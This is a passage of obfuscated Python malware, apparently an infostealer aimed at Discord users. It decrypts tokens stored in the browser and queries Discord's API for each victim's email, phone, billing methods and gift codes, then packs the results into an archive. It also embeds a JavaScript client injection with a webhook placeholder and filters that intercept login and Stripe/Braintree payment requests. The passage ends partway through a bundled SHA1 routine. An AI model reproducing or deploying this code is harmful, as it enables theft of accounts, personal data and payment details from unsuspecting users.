                                            WTTJPTNVHAQZXKVVVIEAWSOJXNAZBWGZBSOUBQZNSOJBPIFUMPFHLCKOJWSJ.append(XVNOCGFUJTUFXKVEEIKMCCUBWRZJZRNAZAKIXGOCMMWJCZGQUIDJUXTYWULLCUGMHOFUNGYTSSZNWJRRLVCMDRUBZOXOCUUYUE)
                                            DSRPFQBJBLREEPYSKUPPUCHZKISKHTBXPEVBIJOEPGKRJTOFZCTOHQVQCPW[HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS] = ('Firefox', os.path.join(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, v4r__file))
        return AQGXEKGQFJRTXLBKFSWUHOROHHEATDTLZNHSPEQEJGTZMGJPRCFMWBTJSNLYTGZXMMKHYVCIIIANZNUMLFVMRKPWDHUM, DSRPFQBJBLREEPYSKUPPUCHZKISKHTBXPEVBIJOEPGKRJTOFZCTOHQVQCPW

    def KUJTIFXMUFSLZFAXQMGUSZBHGUXXNBTASLBROKVEOKFKGQWHII(HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS, OCNHRIKZZPZMPFIHVHMSRUWAVKVXALXRRQFKLVYECTATWJUXCFPTIAPFMVUYTJDMWNSWNLZFQRFRKKDBRREAHRNX):
        return requests.get(OCNHRIKZZPZMPFIHVHMSRUWAVKVXALXRRQFKLVYECTATWJUXCFPTIAPFMVUYTJDMWNSWNLZFQRFRKKDBRREAHRNX, headers={'Authorization': HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS}).status_code == 200

    def LLJCTWGKIJYQVMPWMUJYNSNQTXFQCINYRKOHQCZBOILYICUYZPQVAHVRTHXNMOZHCTPEFRFUQPDNGMJVORGAUTLRQVal(YFTAHRCNEPDLSXPVZUBZZPUYBSSZPFUIUGXIJWWCAYOFSTWXAAFEYTHDUIIPNZZMBOXZUKSHXOFFVPCVTVZPJSATBDMCWMUNLJN, HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV):
        ZEMNJDPOEXZEYMMGBDLVMZPIPDHQEETGEEOJCYFOLPMUXLFNLQQTH = YFTAHRCNEPDLSXPVZUBZZPUYBSSZPFUIUGXIJWWCAYOFSTWXAAFEYTHDUIIPNZZMBOXZUKSHXOFFVPCVTVZPJSATBDMCWMUNLJN[3:15]
        HEPOPRQDRHROFDLVSICGCKZKJKVFVBQDDZZBAHSQSACXHKZEIHMGIWNREHVXASKKKUTDUNPNIQEVYGESBZBXWGEOVXJRMAVJAF = YFTAHRCNEPDLSXPVZUBZZPUYBSSZPFUIUGXIJWWCAYOFSTWXAAFEYTHDUIIPNZZMBOXZUKSHXOFFVPCVTVZPJSATBDMCWMUNLJN[15:]
        JYHTWFWFHOKRALNVITHAOFXQRTHJVNKQOEIADGBVTQKTWHVEYUILCZTHBRZYTZKW = AES.new(HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV, AES.MODE_GCM, ZEMNJDPOEXZEYMMGBDLVMZPIPDHQEETGEEOJCYFOLPMUXLFNLQQTH)
        return JYHTWFWFHOKRALNVITHAOFXQRTHJVNKQOEIADGBVTQKTWHVEYUILCZTHBRZYTZKW.decrypt(HEPOPRQDRHROFDLVSICGCKZKJKVFVBQDDZZBAHSQSACXHKZEIHMGIWNREHVXASKKKUTDUNPNIQEVYGESBZBXWGEOVXJRMAVJAF)[:-16].decode()

    def MTAZZWJNTARMXPZECPXKXKTDCOLQJXYMOPDLYRYWQYPZXQKYDAWFDSHUSYYNPUOTDVLXDQYZAUGVKTOGTRQ(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ):
        if not os.path.exists(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ):
            return None
        with open(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, "r", encoding="utf-8") as v4r_f:
            XEKSEEMLWGAJJDMMFSXSLLTCMNULQVLDYMKDMFANDNYPEWUGKJY = json.load(v4r_f)
        HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV = base64.b64decode(XEKSEEMLWGAJJDMMFSXSLLTCMNULQVLDYMKDMFANDNYPEWUGKJY["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV, None, None, None, 0)[1]

    AQGXEKGQFJRTXLBKFSWUHOROHHEATDTLZNHSPEQEJGTZMGJPRCFMWBTJSNLYTGZXMMKHYVCIIIANZNUMLFVMRKPWDHUM, DSRPFQBJBLREEPYSKUPPUCHZKISKHTBXPEVBIJOEPGKRJTOFZCTOHQVQCPW = FZLBBFQVFIHIPWFTSQQXBSRBORXHUYYNONXINWPULAKOCGQWUZGSBGIDCYOV()
    
    if not AQGXEKGQFJRTXLBKFSWUHOROHHEATDTLZNHSPEQEJGTZMGJPRCFMWBTJSNLYTGZXMMKHYVCIIIANZNUMLFVMRKPWDHUM:
        UUCQZJNKJZCOOGUITJPOTLLLJRGNIJAZHMQJDJAOIXHOWEYIVQYFUOWLLFKRCZFRZRRZITKROZLDGLFTCUGFRMDMXHS = "No discord tokens found."

    for HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS_d15c0rd in AQGXEKGQFJRTXLBKFSWUHOROHHEATDTLZNHSPEQEJGTZMGJPRCFMWBTJSNLYTGZXMMKHYVCIIIANZNUMLFVMRKPWDHUM:
        TOHBKPSSCZKHRLYFXNVEUJVREMLVEEVCTXFRECUCCXBXFLGNLZJMAYAYWUWYOBDMTPYRS += 1

        try: UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS_d15c0rd}).json()
        except: UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN = {"None": "None"}

        PSGNWULGZJFWQJAUPMZQSAZRVHLXGUMOYROYPRHTIHGJLHBCBTNDRTTIPDDYHMLSEIGUDSJJEZDOJOBYBVSZATXDMXBDC = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('username', "None") + '#' + UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('discriminator', "None")
        XQQYFPQFXPQSQBWSOAPHYYNLOIBCWZODYVCHWIAQVZAFDAICFBXFDKUAJYYAUZJAYFPWAUOLEVAVOFY = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('global_name', "None")
        YKDEZJMATXSPVBUXWZDULZOXXLJDKEHFREMRBOWZJDZOZBZXKVSZQSMQWWQUKSEMFNYPXRUKWRGIZQH = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('id', "None")
        ICHIPYCBYUKSJOQDPPITSFWDQYGHMRBWZFVERSJLCVASOOXVGQYLIKYGXMFD = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('email', "None")
        YLCROLSMNOSPGILRTJUOXFZKHEGMQSGFRVJBZHGTUQAIYXRHAMFMNTYEYOYYDUZFSKBDKLYJEIWY = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('verified', "None")
        LJWDZGVMSNHTEVDCHUNABDPEVAGKONUYITOQGHFJJJMIMLLFXGD = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('phone', "None")
        ECWGMGCHPPTWKLTLHPZEHYTIUIZHBIOJNCQROWHHBYODCCWKRGSKKKWNMWSWXXGITGGLIYLVSSRQCWMVO = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('locale', "None")
        YGPFSSEDBNTHPYUNFZIVXDOPTATHMQWRKAHICTFBUSENKKBFXCHBGKTYIAAIAIUJWMUYUNBEYBKCLZCQHRQPZEKBCQVUMJFWXKG = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('mfa_enabled', "None")

        try:
            if UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('premium_type', 'None') == 0:
                PXELWZCAVFDRDEUXPKPNMOJXDSXJXVJXAZOYQVHUEKFWWJHGEUMDIUSGXHBCDS = 'False'
            elif UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('premium_type', 'None') == 1:
                PXELWZCAVFDRDEUXPKPNMOJXDSXJXVJXAZOYQVHUEKFWWJHGEUMDIUSGXHBCDS = 'Nitro Classic'
            elif UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('premium_type', 'None') == 2:
                PXELWZCAVFDRDEUXPKPNMOJXDSXJXVJXAZOYQVHUEKFWWJHGEUMDIUSGXHBCDS = 'Nitro Boosts'
            elif UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('premium_type', 'None') == 3:
                PXELWZCAVFDRDEUXPKPNMOJXDSXJXVJXAZOYQVHUEKFWWJHGEUMDIUSGXHBCDS = 'Nitro Basic'
            else:
                PXELWZCAVFDRDEUXPKPNMOJXDSXJXVJXAZOYQVHUEKFWWJHGEUMDIUSGXHBCDS = 'False'
        except:
            PXELWZCAVFDRDEUXPKPNMOJXDSXJXVJXAZOYQVHUEKFWWJHGEUMDIUSGXHBCDS = "None"

        try: ULQXAABVDFJNEHEVAHIWPBTUIDWCVCVDAXLILFMJLCPGWQIGSMUWFDATPDKVBSUUVLGAIJPEIVWUHPSNYSYCXLUEPZMRTUYQY = f"https://cdn.discordapp.com/avatars/{YKDEZJMATXSPVBUXWZDULZOXXLJDKEHFREMRBOWZJDZOZBZXKVSZQSMQWWQUKSEMFNYPXRUKWRGIZQH}/{UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{YKDEZJMATXSPVBUXWZDULZOXXLJDKEHFREMRBOWZJDZOZBZXKVSZQSMQWWQUKSEMFNYPXRUKWRGIZQH}/{UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{YKDEZJMATXSPVBUXWZDULZOXXLJDKEHFREMRBOWZJDZOZBZXKVSZQSMQWWQUKSEMFNYPXRUKWRGIZQH}/{UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN['avatar']}.png"
        except: ULQXAABVDFJNEHEVAHIWPBTUIDWCVCVDAXLILFMJLCPGWQIGSMUWFDATPDKVBSUUVLGAIJPEIVWUHPSNYSYCXLUEPZMRTUYQY = "None"

        try:
            SKTYMZGNGXCJJVXVYWKXNPQKLSNJGDTFEPRYQFFBTLRESAXDNXN = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS_d15c0rd}).json()
            if SKTYMZGNGXCJJVXVYWKXNPQKLSNJGDTFEPRYQFFBTLRESAXDNXN:
                LLBKBLZWGNOGTQIUSDWOFSDNIQGTNKBCVAEOCCQVKGJVTALLQSWIRTXBTFTBQNJGGTFRGKQCQPZYKSGUZHW = []

                for v4r_method in SKTYMZGNGXCJJVXVYWKXNPQKLSNJGDTFEPRYQFFBTLRESAXDNXN:
                    if v4r_method['type'] == 1:
                        LLBKBLZWGNOGTQIUSDWOFSDNIQGTNKBCVAEOCCQVKGJVTALLQSWIRTXBTFTBQNJGGTFRGKQCQPZYKSGUZHW.append('Bank Card')
                    elif v4r_method['type'] == 2:
                        LLBKBLZWGNOGTQIUSDWOFSDNIQGTNKBCVAEOCCQVKGJVTALLQSWIRTXBTFTBQNJGGTFRGKQCQPZYKSGUZHW.append("Paypal")
                    else:
                        LLBKBLZWGNOGTQIUSDWOFSDNIQGTNKBCVAEOCCQVKGJVTALLQSWIRTXBTFTBQNJGGTFRGKQCQPZYKSGUZHW.append('Other')
                LLBKBLZWGNOGTQIUSDWOFSDNIQGTNKBCVAEOCCQVKGJVTALLQSWIRTXBTFTBQNJGGTFRGKQCQPZYKSGUZHW = ' / '.join(LLBKBLZWGNOGTQIUSDWOFSDNIQGTNKBCVAEOCCQVKGJVTALLQSWIRTXBTFTBQNJGGTFRGKQCQPZYKSGUZHW)
            else:
                LLBKBLZWGNOGTQIUSDWOFSDNIQGTNKBCVAEOCCQVKGJVTALLQSWIRTXBTFTBQNJGGTFRGKQCQPZYKSGUZHW = "None"
        except:
            LLBKBLZWGNOGTQIUSDWOFSDNIQGTNKBCVAEOCCQVKGJVTALLQSWIRTXBTFTBQNJGGTFRGKQCQPZYKSGUZHW = "None"

        try:
            HAOEHURVTCPVQTAFFKCWZWEYEGVEFHOFWRWPEHRTPMKVUHRKZLNWAZCTEFVTFIMTGSNWAY = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS_d15c0rd}).json()
            if HAOEHURVTCPVQTAFFKCWZWEYEGVEFHOFWRWPEHRTPMKVUHRKZLNWAZCTEFVTFIMTGSNWAY:
                ZLRZBFWFJXJPJOPQMDMAEUVKKELIFYTAFZORIFAKUFEDJESKCAQIBYPMNFPQJVPVUHXZLYCQVFQKRCSALLKPAQZVJRKZIKJD = []
                for VLFUEADBGQDPRXUOIIRAGCBTWONBYJAVIGSOXRVPWRLAOCJJEHSNPMHYKFW in HAOEHURVTCPVQTAFFKCWZWEYEGVEFHOFWRWPEHRTPMKVUHRKZLNWAZCTEFVTFIMTGSNWAY:
                    VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO = VLFUEADBGQDPRXUOIIRAGCBTWONBYJAVIGSOXRVPWRLAOCJJEHSNPMHYKFW['promotion']['outbound_title']
                    VLFUEADBGQDPRXUOIIRAGCBTWONBYJAVIGSOXRVPWRLAOCJJEHSNPMHYKFW = VLFUEADBGQDPRXUOIIRAGCBTWONBYJAVIGSOXRVPWRLAOCJJEHSNPMHYKFW['code']
                    IKAXQSEUKYUXKBKMVFZOVXAGPYTLIKCSEIEAWHMBNZQAGOYYXMIFUDUUHWREZDEBPXEFQJSCYFZFZTKEADEMONNAXOUUA = f"Gift: \"{VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO}\" Code: \"{VLFUEADBGQDPRXUOIIRAGCBTWONBYJAVIGSOXRVPWRLAOCJJEHSNPMHYKFW}\""
                    if len('\n\n'.join(VLFUEADBGQDPRXUOIIRAGCBTWONBYJAVIGSOXRVPWRLAOCJJEHSNPMHYKFW)) + len(IKAXQSEUKYUXKBKMVFZOVXAGPYTLIKCSEIEAWHMBNZQAGOYYXMIFUDUUHWREZDEBPXEFQJSCYFZFZTKEADEMONNAXOUUA) >= 1024:
                        break
                    ZLRZBFWFJXJPJOPQMDMAEUVKKELIFYTAFZORIFAKUFEDJESKCAQIBYPMNFPQJVPVUHXZLYCQVFQKRCSALLKPAQZVJRKZIKJD.append(IKAXQSEUKYUXKBKMVFZOVXAGPYTLIKCSEIEAWHMBNZQAGOYYXMIFUDUUHWREZDEBPXEFQJSCYFZFZTKEADEMONNAXOUUA)
                if len(ZLRZBFWFJXJPJOPQMDMAEUVKKELIFYTAFZORIFAKUFEDJESKCAQIBYPMNFPQJVPVUHXZLYCQVFQKRCSALLKPAQZVJRKZIKJD) > 0:
                    VLFUEADBGQDPRXUOIIRAGCBTWONBYJAVIGSOXRVPWRLAOCJJEHSNPMHYKFW = '\n\n'.join(ZLRZBFWFJXJPJOPQMDMAEUVKKELIFYTAFZORIFAKUFEDJESKCAQIBYPMNFPQJVPVUHXZLYCQVFQKRCSALLKPAQZVJRKZIKJD)
                else:
                    VLFUEADBGQDPRXUOIIRAGCBTWONBYJAVIGSOXRVPWRLAOCJJEHSNPMHYKFW = "None"
            else:
                VLFUEADBGQDPRXUOIIRAGCBTWONBYJAVIGSOXRVPWRLAOCJJEHSNPMHYKFW = "None"
        except:
            VLFUEADBGQDPRXUOIIRAGCBTWONBYJAVIGSOXRVPWRLAOCJJEHSNPMHYKFW = "None"
    
        try: v4r_software_name, BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ = DSRPFQBJBLREEPYSKUPPUCHZKISKHTBXPEVBIJOEPGKRJTOFZCTOHQVQCPW.get(HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS_d15c0rd, ("Unknown", "Unknown"))
        except: v4r_software_name, BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ = "Unknown", "Unknown"

        UUCQZJNKJZCOOGUITJPOTLLLJRGNIJAZHMQJDJAOIXHOWEYIVQYFUOWLLFKRCZFRZRRZITKROZLDGLFTCUGFRMDMXHS = UUCQZJNKJZCOOGUITJPOTLLLJRGNIJAZHMQJDJAOIXHOWEYIVQYFUOWLLFKRCZFRZRRZITKROZLDGLFTCUGFRMDMXHS + f"""
Discord Account n°{str(TOHBKPSSCZKHRLYFXNVEUJVREMLVEEVCTXFRECUCCXBXFLGNLZJMAYAYWUWYOBDMTPYRS)}:
 - Path Found      : {BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ}
 - Software        : {v4r_software_name}
 - Token           : {HQZNBMVLROYZKWNUSJJHUMHTLHJHBLUCHAYQAAGROKULUKBNDFCPWBPAPS_d15c0rd}
 - Username        : {PSGNWULGZJFWQJAUPMZQSAZRVHLXGUMOYROYPRHTIHGJLHBCBTNDRTTIPDDYHMLSEIGUDSJJEZDOJOBYBVSZATXDMXBDC}
 - Display Name    : {XQQYFPQFXPQSQBWSOAPHYYNLOIBCWZODYVCHWIAQVZAFDAICFBXFDKUAJYYAUZJAYFPWAUOLEVAVOFY}
 - Id              : {YKDEZJMATXSPVBUXWZDULZOXXLJDKEHFREMRBOWZJDZOZBZXKVSZQSMQWWQUKSEMFNYPXRUKWRGIZQH}
 - Email           : {ICHIPYCBYUKSJOQDPPITSFWDQYGHMRBWZFVERSJLCVASOOXVGQYLIKYGXMFD}
 - Email Verified  : {YLCROLSMNOSPGILRTJUOXFZKHEGMQSGFRVJBZHGTUQAIYXRHAMFMNTYEYOYYDUZFSKBDKLYJEIWY}
 - Phone           : {LJWDZGVMSNHTEVDCHUNABDPEVAGKONUYITOQGHFJJJMIMLLFXGD}
 - Nitro           : {PXELWZCAVFDRDEUXPKPNMOJXDSXJXVJXAZOYQVHUEKFWWJHGEUMDIUSGXHBCDS}
 - Language        : {ECWGMGCHPPTWKLTLHPZEHYTIUIZHBIOJNCQROWHHBYODCCWKRGSKKKWNMWSWXXGITGGLIYLVSSRQCWMVO}
 - Billing         : {LLBKBLZWGNOGTQIUSDWOFSDNIQGTNKBCVAEOCCQVKGJVTALLQSWIRTXBTFTBQNJGGTFRGKQCQPZYKSGUZHW}
 - Gift Code       : {VLFUEADBGQDPRXUOIIRAGCBTWONBYJAVIGSOXRVPWRLAOCJJEHSNPMHYKFW}
 - Profile Picture : {ULQXAABVDFJNEHEVAHIWPBTUIDWCVCVDAXLILFMJLCPGWQIGSMUWFDATPDKVBSUUVLGAIJPEIVWUHPSNYSYCXLUEPZMRTUYQY}
 - Multi-Factor Authentication : {YGPFSSEDBNTHPYUNFZIVXDOPTATHMQWRKAHICTFBUSENKKBFXCHBGKTYIAAIAIUJWMUYUNBEYBKCLZCQHRQPZEKBCQVUMJFWXKG}
"""
    KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.writestr(f"Discord Accounts ({TOHBKPSSCZKHRLYFXNVEUJVREMLVEEVCTXFRECUCCXBXFLGNLZJMAYAYWUWYOBDMTPYRS}).txt", UUCQZJNKJZCOOGUITJPOTLLLJRGNIJAZHMQJDJAOIXHOWEYIVQYFUOWLLFKRCZFRZRRZITKROZLDGLFTCUGFRMDMXHS)

    return TOHBKPSSCZKHRLYFXNVEUJVREMLVEEVCTXFRECUCCXBXFLGNLZJMAYAYWUWYOBDMTPYRS

BIXEUYBLAHQIEHJDTIQRXNGJIGPHCRZNONRSRXZCMEBUKAHLMHWTLLVXVE = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
